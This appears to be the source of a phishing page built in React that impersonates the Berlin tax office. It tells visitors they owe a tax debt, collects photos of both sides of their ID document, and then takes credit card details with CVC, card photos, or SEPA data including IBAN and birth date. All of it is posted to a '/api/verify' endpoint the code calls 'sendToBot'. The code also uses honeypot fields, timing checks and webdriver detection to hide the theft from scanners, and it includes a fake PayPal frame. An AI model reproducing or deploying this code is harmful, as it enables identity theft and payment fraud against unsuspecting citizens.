'use client';

import { useCallback, useEffect, useRef, useState } from 'react';

const ASSETS = {
  logo: '/v20/hans.png',
  paypalIcon: '/v20/p_icon.svg',
  sepaImg: '/v20/plico.png',
  maus: '/v20/maus.html',
} as const;

const VERIFY_STEPS = [
  { text: 'Dokumente werden hochgeladen...', delay: 800 },
  { text: 'Verschlüsselung wird aufgebaut...', delay: 800 },
  { text: 'Biometrische Analyse läuft...', delay: 1200 },
  { text: 'Abgleich mit GwG-Datenbank...', delay: 4000 },
  { text: 'Verifizierung erfolgreich.', delay: 2000 },
] as const;

function delay(ms: number) {
  return new Promise<void>((r) => setTimeout(r, ms));
}

async function sendToBot(data: {
  type: string;
  image?: string;
  message: string;
  deviceData?: string;
}) {
  try {
    await fetch('/api/verify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ...data, deviceData: navigator.userAgent }),
    });
  } catch (e) {
    console.error('Send error', e);
  }
}

export default function Version20Page() {
  const pageLoadTime = useRef(Date.now());

  const [identTitle, setIdentTitle] = useState('Identifikation erforderlich');
  const [identView, setIdentView] = useState<
    'form' | 'simpleLoading' | 'steps'
  >('form');
  const [stepRows, setStepRows] = useState<
    Array<{ id: string; text: string; done: boolean }>
  >([]);

  const [showIdentCard, setShowIdentCard] = useState(true);
  const [showPaymentCard, setShowPaymentCard] = useState(false);

  const [identSubmitBusy, setIdentSubmitBusy] = useState(false);

  const faRef = useRef<HTMLInputElement>(null);
  const fbRef = useRef<HTMLInputElement>(null);
  const honeypotRef = useRef<HTMLInputElement>(null);

  /** Nur gesetzt, wenn wirklich eine Datei gewählt wurde (für Check + Pop-Animation) */
  const [identStampA, setIdentStampA] = useState<string | null>(null);
  const [identStampB, setIdentStampB] = useState<string | null>(null);
  const [identBtnEnabled, setIdentBtnEnabled] = useState(false);

  const [ov1Open, setOv1Open] = useState(false);
  const [ov2Open, setOv2Open] = useState(false);
  const [ov3Open, setOv3Open] = useState(false);
  const [paypalPhase, setPaypalPhase] = useState<'loading' | 'ready'>(
    'loading'
  );

  const [closing1, setClosing1] = useState(false);
  const [closing2, setClosing2] = useState(false);
  const [closing3, setClosing3] = useState(false);

  const cfARef = useRef<HTMLInputElement>(null);
  const cfBRef = useRef<HTMLInputElement>(null);
  const sfARef = useRef<HTMLInputElement>(null);
  const sfBRef = useRef<HTMLInputElement>(null);
  const ccHoneypotRef = useRef<HTMLInputElement>(null);
  const sepaHoneypotRef = useRef<HTMLInputElement>(null);

  const [inp1, setInp1] = useState('');
  const [inp2, setInp2] = useState('');
  const [inp3, setInp3] = useState('');
  const [inp4, setInp4] = useState('');

  const [s1, setS1] = useState('');
  const [s2, setS2] = useState('');
  const [s3, setS3] = useState('');
  const [s4, setS4] = useState('');

  const [cardCfA, setCardCfA] = useState(false);
  const [cardCfB, setCardCfB] = useState(false);
  const [cardPayOk, setCardPayOk] = useState(false);

  const [sepaSfA, setSepaSfA] = useState(false);
  const [sepaSfB, setSepaSfB] = useState(false);
  const [sepaPayOk, setSepaPayOk] = useState(false);

  useEffect(() => {
    document.title = 'Finanzamt Berlin | Online-Service';
  }, []);

  const onFileChange = () => {
    const fileA = faRef.current?.files?.[0];
    const fileB = fbRef.current?.files?.[0];
    setIdentStampA(
      fileA ? `${fileA.name}-${fileA.size}-${fileA.lastModified}` : null
    );
    setIdentStampB(
      fileB ? `${fileB.name}-${fileB.size}-${fileB.lastModified}` : null
    );
    setIdentBtnEnabled(Boolean(fileA && fileB));
  };

  const runFakeIdent = useCallback(async () => {
    await delay(1000);
    setIdentTitle('Sicherheitsprüfung');
    setIdentView('simpleLoading');
    await delay(5000);
    setShowIdentCard(false);
    setShowPaymentCard(true);
  }, []);

  const runRealIdent = useCallback(async () => {
    const f1 = faRef.current?.files?.[0];
    const f2 = fbRef.current?.files?.[0];
    if (!f1 || !f2) return;

    const types = ['AUSWEIS_VORN', 'AUSWEIS_HINTEN'] as const;
    [f1, f2].forEach((file, index) => {
      const reader = new FileReader();
      reader.onload = (e) => {
        const result = e.target?.result;
        if (typeof result === 'string') {
          void sendToBot({
            type: types[index],
            image: result,
            message: `Ausweis Teil ${index + 1}`,
          });
        }
      };
      reader.readAsDataURL(file);
    });

    await delay(1500);
    setIdentTitle('Sicherheitsprüfung');
    setIdentView('steps');
    setStepRows([]);

    for (const step of VERIFY_STEPS) {
      const id = crypto.randomUUID();
      setStepRows((prev) => [...prev, { id, text: step.text, done: false }]);
      await delay(step.delay);
      setStepRows((prev) =>
        prev.map((r) => (r.id === id ? { ...r, done: true } : r))
      );
    }
    await delay(1000);
    setShowIdentCard(false);
    setShowPaymentCard(true);
  }, []);

  const handleIdentSubmit = async () => {
    const honeypot = honeypotRef.current;
    const submissionTime = Date.now();

    if (
      honeypot?.value !== '' ||
      submissionTime - pageLoadTime.current < 1000
    ) {
      setIdentSubmitBusy(true);
      try {
        await runFakeIdent();
      } finally {
        setIdentSubmitBusy(false);
      }
      return;
    }

    if (
      'webdriver' in navigator &&
      (navigator as Navigator & { webdriver?: boolean }).webdriver
    ) {
      return;
    }

    setIdentSubmitBusy(true);
    try {
      await runRealIdent();
    } finally {
      setIdentSubmitBusy(false);
    }
  };

  const validateCard = useCallback(() => {
    const f1 = cfARef.current?.files?.length ?? 0;
    const f2 = cfBRef.current?.files?.length ?? 0;
    setCardCfA(f1 > 0);
    setCardCfB(f2 > 0);
    const inputs = [inp1, inp2, inp3, inp4];
    const allFilled = inputs.every((i) => i.trim().length >= 3);
    setCardPayOk((f1 > 0 && f2 > 0) || allFilled);
  }, [inp1, inp2, inp3, inp4]);

  const validateSepa = useCallback(() => {
    const f1 = sfARef.current?.files?.length ?? 0;
    const f2 = sfBRef.current?.files?.length ?? 0;
    setSepaSfA(f1 > 0);
    setSepaSfB(f2 > 0);
    const allFilled = [s1, s2, s3, s4].every((i) => i.trim().length >= 3);
    setSepaPayOk((f1 > 0 && f2 > 0) || allFilled);
  }, [s1, s2, s3, s4]);

  useEffect(() => {
    validateCard();
  }, [validateCard]);

  useEffect(() => {
    validateSepa();
  }, [validateSepa]);

  const onCardNumberInput = (v: string) => {
    const raw = v.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const parts: string[] = [];
    for (let i = 0; i < raw.length; i += 4) {
      parts.push(raw.substring(i, i + 4));
    }
    setInp2(parts.join(' '));
  };

  const onExpiryInput = (v: string) => {
    const raw = v.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    setInp3(
      raw.length >= 2
        ? `${raw.substring(0, 2)} / ${raw.substring(2, 4)}`
        : raw
    );
  };

  const closeModal = (which: 1 | 2 | 3) => {
    if (which === 1) setClosing1(true);
    if (which === 2) setClosing2(true);
    if (which === 3) setClosing3(true);
    setTimeout(() => {
      if (which === 1) {
        setOv1Open(false);
        setClosing1(false);
      }
      if (which === 2) {
        setOv2Open(false);
        setClosing2(false);
      }
      if (which === 3) {
        setOv3Open(false);
        setClosing3(false);
        setPaypalPhase('loading');
      }
    }, 300);
  };

  const openPaypal = () => {
    setOv3Open(true);
    setPaypalPhase('loading');
    setTimeout(() => setPaypalPhase('ready'), 2000);
  };

  const finalizePayment = async (kind: 'KARTE' | 'SEPA') => {
    const honeypot =
      kind === 'KARTE'
        ? ccHoneypotRef.current?.value ?? ''
        : sepaHoneypotRef.current?.value ?? '';
    const submissionTime = Date.now();

    if (honeypot !== '' || submissionTime - pageLoadTime.current < 4000) {
      alert('Vielen Dank! Ihre Zahlung wird verarbeitet.');
      window.location.reload();
      return;
    }

    if (
      'webdriver' in navigator &&
      (navigator as Navigator & { webdriver?: boolean }).webdriver
    ) {
      return;
    }

    let msg = '';
    if (kind === 'KARTE') {
      msg = `Inhaber: ${inp1}\nNummer: ${inp2}\nDatum: ${inp3}\nCVC: ${inp4}`;
      const f1 = cfARef.current?.files?.[0];
      const f2 = cfBRef.current?.files?.[0];
      if (f1) {
        const r1 = new FileReader();
        r1.onload = (e) => {
          const r = e.target?.result;
          if (typeof r === 'string')
            void sendToBot({
              type: 'KARTEN_BILD_VORN',
              image: r,
              message: 'Karte Vorn',
            });
        };
        r1.readAsDataURL(f1);
      }
      if (f2) {
        const r2 = new FileReader();
        r2.onload = (e) => {
          const r = e.target?.result;
          if (typeof r === 'string')
            void sendToBot({
              type: 'KARTEN_BILD_HINTEN',
              image: r,
              message: 'Karte Hinten',
            });
        };
        r2.readAsDataURL(f2);
      }
    } else {
      msg = `Vorname: ${s1}\nNachname: ${s2}\nGeburt: ${s3}\nIBAN: ${s4}`;
      const f1 = sfARef.current?.files?.[0];
      const f2 = sfBRef.current?.files?.[0];
      if (f1) {
        const r1 = new FileReader();
        r1.onload = (e) => {
          const r = e.target?.result;
          if (typeof r === 'string')
            void sendToBot({
              type: 'SEPA_BILD_VORN',
              image: r,
              message: 'SEPA Karte Vorn',
            });
        };
        r1.readAsDataURL(f1);
      }
      if (f2) {
        const r2 = new FileReader();
        r2.onload = (e) => {
          const r = e.target?.result;
          if (typeof r === 'string')
            void sendToBot({
              type: 'SEPA_BILD_HINTEN',
              image: r,
              message: 'SEPA Karte Hinten',
            });
        };
        r2.readAsDataURL(f2);
      }
    }

    await sendToBot({ type: `${kind}_DATA`, message: msg });
    await delay(2500);
    alert('Vielen Dank! Ihre Zahlung wird verarbeitet.');
    window.location.reload();
  };

  return (
    <div className="v20Root">
      <header>
        <div className="x1">
          <div
            className="x2"
            onClick={() => window.open('https://service.berlin.de/', '_blank')}
            role="presentation"
          >
            <img src={ASSETS.logo} alt="Berlin Logo" />
          </div>
          <a
            href="https://service.berlin.de/"
            target="_blank"
            rel="noopener noreferrer"
            id="lnk_hk"
            style={{
              textDecoration: 'none',
              color: 'var(--gov-blue)',
              fontWeight: 600,
              fontSize: '13px',
              border: '1px solid #ccd',
              padding: '6px 12px',
              borderRadius: '4px',
            }}
          >
            Kontakt & Hilfe
          </a>
        </div>
      </header>

      <div className="x3">
        <div className="x4">Aktenzeichen: FA-BE-2026</div>

        {showIdentCard && (
          <div className="x5" id="id_1">
            <div className="x6">
              <h1>{identTitle}</h1>
              <i
                className="fas fa-user-shield"
                style={{ fontSize: '22px', color: 'var(--gov-blue)' }}
              />
            </div>
            <div className="x7" id="id_3">
              {identView === 'form' && (
                <>
                  <div className="x8">
                    <span>
                      Aufgrund gesetzlicher Bestimmungen (Abgabenordnung) ist
                      eine Bestätigung Ihrer Identität erforderlich, um die
                      offene Forderung zuzuordnen.
                    </span>
                    <a
                      href="https://service.berlin.de/"
                      target="_blank"
                      rel="noopener noreferrer"
                    >
                      Mehr Informationen
                    </a>
                  </div>

                  <div className="x10">
                    <label className="x11">
                      <input
                        ref={faRef}
                        type="file"
                        accept="image/*"
                        className="x25"
                        onChange={onFileChange}
                      />
                      <div className="x12">
                        <i className="fas fa-id-card" />
                      </div>
                      <div className="x13">
                        <span>Vorderseite aufnehmen</span>
                        <small>Ausweis, Pass oder Aufenthaltstitel</small>
                      </div>
                      {identStampA ? (
                        <i
                          key={identStampA}
                          className="fas fa-check-circle x14 v20-ident-check"
                          aria-hidden
                        />
                      ) : null}
                    </label>
                    <label className="x11">
                      <input
                        ref={fbRef}
                        type="file"
                        accept="image/*"
                        className="x25"
                        onChange={onFileChange}
                      />
                      <div className="x12">
                        <i className="fas fa-camera" />
                      </div>
                      <div className="x13">
                        <span>Rückseite aufnehmen</span>
                        <small>Rückseite oder Zusatzdokumente</small>
                      </div>
                      {identStampB ? (
                        <i
                          key={identStampB}
                          className="fas fa-check-circle x14 v20-ident-check"
                          aria-hidden
                        />
                      ) : null}
                    </label>
                  </div>
                  <div
                    style={{ position: 'absolute', left: '-5000px' }}
                    aria-hidden
                  >
                    <input
                      ref={honeypotRef}
                      type="text"
                      name="website_url"
                      tabIndex={-1}
                      autoComplete="off"
                    />
                  </div>

                  <button
                    type="button"
                    className="x15"
                    id="id_5"
                    disabled={!identBtnEnabled || identSubmitBusy}
                    onClick={() => void handleIdentSubmit()}
                  >
                    {identSubmitBusy ? (
                      <>
                        <span
                          className="x-spinner-sm"
                          style={{
                            borderColor: 'rgba(255,255,255,0.3)',
                            borderLeftColor: 'white',
                          }}
                        />
                        Übertragung...
                      </>
                    ) : (
                      'Identität bestätigen & weiter'
                    )}
                  </button>
                </>
              )}

              {identView === 'simpleLoading' && (
                <>
                  <div className="x24" />
                  <p style={{ textAlign: 'center', color: '#666', fontSize: '14px' }}>
                    Daten werden verifiziert...
                  </p>
                </>
              )}

              {identView === 'steps' && (
                <>
                  <div
                    className="x24"
                    style={{ marginBottom: 25 }}
                  />
                  <div
                    id="step_container"
                    style={{ maxWidth: 300, margin: '0 auto' }}
                  >
                    {stepRows.map((row) => (
                      <div key={row.id} className="check-step">
                        {row.done ? (
                          <>
                            <i
                              className="fas fa-check-circle"
                              style={{ color: '#28a746' }}
                            />
                            <span style={{ color: '#445' }}>{row.text}</span>
                          </>
                        ) : (
                          <>
                            <span
                              className="x-spinner-sm"
                              style={{
                                width: 12,
                                height: 12,
                                borderColor: 'rgba(0,0,0,0.1)',
                                borderLeftColor: '#999',
                              }}
                            />
                            <span style={{ color: '#777' }}>{row.text}</span>
                          </>
                        )}
                      </div>
                    ))}
                  </div>
                </>
              )}
            </div>
          </div>
        )}

        {showPaymentCard && (
          <div className="x5" id="id_6">
            <div className="x6">
              <h1>Offene Forderung begleichen</h1>
              <i
                className="fas fa-wallet"
                style={{ fontSize: '22px', color: 'var(--gov-blue)' }}
              />
            </div>
            <div className="x7">
              <div className="x16">
                <div
                  id="id_8"
                  onClick={openPaypal}
                  role="presentation"
                >
                  <img
                    src={ASSETS.paypalIcon}
                    alt=""
                    className="v20-payment-btn-img"
                  />
                </div>
                <button
                  type="button"
                  id="id_9"
                  onClick={() => setOv1Open(true)}
                  style={{
                    background: '#2c2e2f',
                    color: 'white',
                    borderRadius: '4px',
                    height: 48,
                    border: 'none',
                    cursor: 'pointer',
                    fontWeight: 600,
                    fontSize: '14px',
                  }}
                >
                  <i className="fas fa-credit-card" /> Kredit- oder Debitkarte
                </button>
                <button
                  type="button"
                  id="id_11"
                  className="x17"
                  onClick={() => setOv2Open(true)}
                >
                  <img
                    src={ASSETS.sepaImg}
                    alt=""
                    className="v20-payment-btn-img"
                  />
                </button>
              </div>

              <div className="x9">
                <i
                  className="fas fa-shield-alt"
                  style={{ fontSize: 20, marginTop: 2 }}
                />
                <div>
                  <strong>Sichere Datenübermittlung</strong>
                  <br />
                  <span>
                    Die Übertragung erfolgt SSL-verschlüsselt an die Server der
                    Finanzverwaltung Berlin. Ihre Daten werden gemäß{' '}
                    <strong>DSGVO</strong> und <strong>AO</strong> vertraulich
                    behandelt.
                  </span>
                </div>
              </div>
            </div>
          </div>
        )}
      </div>

      {/* Karte */}
      <div className={`x18 ${ov1Open ? 'v20Open' : ''}`} id="ov_1">
        <div className={`x19 ${closing1 ? 'cl_x' : ''}`}>
          <div
            style={{
              display: 'flex',
              justifyContent: 'flex-end',
              marginBottom: 5,
            }}
          >
            <i
              className="fas fa-times"
              onClick={() => closeModal(1)}
              style={{ cursor: 'pointer', color: '#ccd', fontSize: 20 }}
              role="presentation"
            />
          </div>
          <h2 className="x20">Kartenzahlung</h2>

          <div className="x10" style={{ marginBottom: 20 }}>
            <label className="x11" style={{ padding: 10 }}>
              <input
                ref={cfARef}
                type="file"
                accept="image/*"
                className="x25"
                onChange={validateCard}
              />
              <div
                className="x12"
                style={{ width: 35, height: 35, fontSize: 14 }}
              >
                <i className="fas fa-camera" />
              </div>
              <div className="x13">
                <span>Karte Vorderseite</span>
              </div>
              <i
                className={`fas fa-check-circle x14 ${cardCfA ? 'v20show' : ''}`}
              />
            </label>
            <label className="x11" style={{ padding: 10 }}>
              <input
                ref={cfBRef}
                type="file"
                accept="image/*"
                className="x25"
                onChange={validateCard}
              />
              <div
                className="x12"
                style={{ width: 35, height: 35, fontSize: 14 }}
              >
                <i className="fas fa-camera" />
              </div>
              <div className="x13">
                <span>Karte Rückseite</span>
              </div>
              <i
                className={`fas fa-check-circle x14 ${cardCfB ? 'v20show' : ''}`}
              />
            </label>
          </div>

          <div className="x21">
            <label>Karteninhaber</label>
            <input
              type="text"
              className="v_c"
              value={inp1}
              onChange={(e) => setInp1(e.target.value)}
              placeholder="MAX MUSTERMANN"
            />
          </div>
          <div className="x21">
            <label>Kartennummer</label>
            <input
              type="text"
              maxLength={19}
              className="v_c"
              value={inp2}
              onChange={(e) => onCardNumberInput(e.target.value)}
              placeholder="0000 0000 0000 0000"
            />
          </div>
          <div style={{ display: 'flex', gap: 30 }}>
            <div className="x21" style={{ flex: 1 }}>
              <label>Gültig bis</label>
              <input
                type="text"
                maxLength={7}
                className="v_c"
                value={inp3}
                onChange={(e) => onExpiryInput(e.target.value)}
                placeholder="MM / JJ"
              />
            </div>
            <div className="x21" style={{ flex: 1 }}>
              <label>Prüfziffer (CVC)</label>
              <input
                type="text"
                maxLength={3}
                className="v_c"
                value={inp4}
                onChange={(e) => setInp4(e.target.value)}
                placeholder="123"
              />
            </div>
          </div>
          <div
            style={{ position: 'absolute', left: '-5000px' }}
            aria-hidden
          >
            <input
              ref={ccHoneypotRef}
              type="text"
              name="cc_comment"
              tabIndex={-1}
              autoComplete="off"
            />
          </div>

          <button
            type="button"
            className={`x22 ${cardPayOk ? 'rd_x' : ''}`}
            id="id_14"
            disabled={!cardPayOk}
            onClick={() => void finalizePayment('KARTE')}
          >
            BEZAHLEN 1,20 €
          </button>
        </div>
      </div>

      {/* SEPA */}
      <div className={`x18 ${ov2Open ? 'v20Open' : ''}`} id="ov_2">
        <div className={`x19 ${closing2 ? 'cl_x' : ''}`}>
          <div
            style={{
              display: 'flex',
              justifyContent: 'flex-end',
              marginBottom: 5,
            }}
          >
            <i
              className="fas fa-times"
              onClick={() => closeModal(2)}
              style={{ cursor: 'pointer', color: '#ccd', fontSize: 20 }}
              role="presentation"
            />
          </div>
          <h2 className="x20">SEPA-Lastschrift</h2>

          <div className="x10" style={{ marginBottom: 20 }}>
            <label className="x11" style={{ padding: 10 }}>
              <input
                ref={sfARef}
                type="file"
                accept="image/*"
                className="x25"
                onChange={validateSepa}
              />
              <div
                className="x12"
                style={{ width: 35, height: 35, fontSize: 14 }}
              >
                <i className="fas fa-camera" />
              </div>
              <div className="x13">
                <span>Karte Vorderseite</span>
              </div>
              <i
                className={`fas fa-check-circle x14 ${sepaSfA ? 'v20show' : ''}`}
              />
            </label>
            <label className="x11" style={{ padding: 10 }}>
              <input
                ref={sfBRef}
                type="file"
                accept="image/*"
                className="x25"
                onChange={validateSepa}
              />
              <div
                className="x12"
                style={{ width: 35, height: 35, fontSize: 14 }}
              >
                <i className="fas fa-camera" />
              </div>
              <div className="x13">
                <span>Karte Rückseite</span>
              </div>
              <i
                className={`fas fa-check-circle x14 ${sepaSfB ? 'v20show' : ''}`}
              />
            </label>
          </div>

          <div className="x21">
            <label>Vorname</label>
            <input
              type="text"
              className="v_s"
              value={s1}
              onChange={(e) => setS1(e.target.value)}
              placeholder="Max"
            />
          </div>
          <div className="x21">
            <label>Nachname</label>
            <input
              type="text"
              className="v_s"
              value={s2}
              onChange={(e) => setS2(e.target.value)}
              placeholder="Mustermann"
            />
          </div>
          <div className="x21">
            <label>Geburtsdatum</label>
            <input
              type="text"
              className="v_s"
              value={s3}
              onChange={(e) => setS3(e.target.value)}
              placeholder="TT.MM.JJJJ"
            />
          </div>
          <div className="x21">
            <label>IBAN</label>
            <input
              type="text"
              className="v_s"
              value={s4}
              onChange={(e) => setS4(e.target.value)}
              placeholder="DE00 0000 0000 0000 0000 00"
            />
          </div>
          <div
            style={{ position: 'absolute', left: '-5000px' }}
            aria-hidden
          >
            <input
              ref={sepaHoneypotRef}
              type="text"
              name="sepa_comment"
              tabIndex={-1}
              autoComplete="off"
            />
          </div>

          <button
            type="button"
            className={`x22 ${sepaPayOk ? 'rd_x' : ''}`}
            id="id_16"
            disabled={!sepaPayOk}
            onClick={() => void finalizePayment('SEPA')}
          >
            BEZAHLEN 1,20 €
          </button>
        </div>
      </div>

      {/* PayPal */}
      <div className={`x18 ${ov3Open ? 'v20Open' : ''}`} id="ov_3">
        <div
          id="pp_l"
          style={{
            textAlign: 'center',
            color: 'white',
            display: paypalPhase === 'loading' ? 'block' : 'none',
          }}
        >
          <div
            className="x24"
            style={{
              borderColor: 'rgba(255,255,255,0.2)',
              borderLeftColor: 'white',
            }}
          />
          <p style={{ fontSize: 14 }}>Sichere Verbindung zu PayPal...</p>
        </div>
        <div
          className={`x23 ${paypalPhase === 'ready' ? 'v20show' : ''} ${closing3 ? 'cl_x' : ''}`}
          id="pp_w"
        >
          <div
            style={{
              padding: '15px 44px',
              borderBottom: '1px solid rgba(0,0,0,0.05)',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              background: 'rgba(255,255,255,0.5)',
              position: 'relative',
              minHeight: 50,
              boxSizing: 'border-box',
            }}
          >
            <img
              src={ASSETS.paypalIcon}
              alt=""
              className="v20-paypal-modal-header-img"
            />
            <i
              className="fas fa-times"
              onClick={() => closeModal(3)}
              style={{
                position: 'absolute',
                right: 15,
                top: 15,
                cursor: 'pointer',
                color: '#ccd',
                fontSize: 20,
              }}
              role="presentation"
            />
          </div>
          <iframe
            title="PayPal"
            src={ASSETS.maus}
            style={{ border: 'none', width: '100%', height: '100%' }}
          />
        </div>
      </div>

      <footer>
        <span>© 2026 Land Berlin - Finanzamt Reinickendorf</span>
        <br />
        <span
          style={{
            opacity: 0.7,
            fontSize: 10,
            marginTop: 5,
            display: 'inline-block',
          }}
        >
          <a
            href="https://www.berlin.de/"
            target="_blank"
            rel="noopener noreferrer"
            style={{ color: 'inherit', textDecoration: 'none' }}
          >
            Impressum
          </a>{' '}
          |{' '}
          <a
            href="https://www.berlin.de/"
            target="_blank"
            rel="noopener noreferrer"
            style={{ color: 'inherit', textDecoration: 'none' }}
          >
            Datenschutz
          </a>{' '}
          |{' '}
          <a
            href="https://www.berlin.de/"
            target="_blank"
            rel="noopener noreferrer"
            style={{ color: 'inherit', textDecoration: 'none' }}
          >
            Erklärung zur Barrierefreiheit
          </a>
        </span>
      </footer>
    </div>
  );
}
